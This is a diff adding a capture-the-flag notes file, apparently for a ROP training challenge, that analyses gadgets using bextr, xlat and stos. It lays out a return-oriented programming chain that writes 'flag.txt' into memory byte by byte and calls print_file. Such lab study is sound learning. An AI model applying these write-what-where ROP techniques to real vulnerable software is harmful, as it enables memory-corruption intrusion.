@@ -1,0 +1,60 @@
+questionableGadgets
+===================
+   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
+   0x0000000000400629 <+1>:     ret
+   0x000000000040062a <+2>:     pop    rdx
+   0x000000000040062b <+3>:     pop    rcx
+   0x000000000040062c <+4>:     add    rcx,0x3ef2
+   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
+   0x0000000000400638 <+16>:    ret
+   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
+   0x000000000040063a <+18>:    ret
+   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
+
+New instructions
+================
+bextr
+- can be used to set rbx for the next gadget, xlat
+- bits are extracted from rcx (2nd operand) to rbx (1st operand)
+- lower 8 bits (dl) of rdx (3rd operand) is treated as the bit index, the next 8 bits (dh) specify the length of the bit vector
+- basically set rdx[7:0] to 0 and rdx[15:8] to 64 in order to simulate "mov rbx, rcx"
+
+xlat
+- uses al to index a table at [rbx] and copy a byte to al
+  - we don't have a table, just a byte at a memory address
+  - we could zero al, but we don't have enough space (0x200) for "mov eax, 0" gadgets
+  - we don't need to zero al since we know the value of rax (return value of puts("Thank you!") which is 0xb)
+  - just subtract last al value from rcx/rbx
+  - in future calls, al will be the last byte we wrote to memory
+- use bextr gadget to set rbx
+
+stos
+- basically "mov BYTE PTR [rdi], al"
+- use in conjunction with xlat to achieve write-what-where
+
+What to Run
+===========
+; sets rbx, the address of the byte value
+pop rdx
+pop rcx
+add rcx, 0x3ef2
+bextr rbx, rcx, rdx
+ret 
+
+; sets al to [rbx]
+xlatb (mov al, BYTE PTR [rbx] when al is 0)
+ret 
+
+; sets rdi to destination address
+pop rdi
+ret 
+
+; write value in al at [rdi]
+stos BYTE PTR [rdi], al
+ret 
+
+; rinse and repeat for all bytes in "flag.txt"
+
+; set argument and return to print_file
+pop rdi
+ret
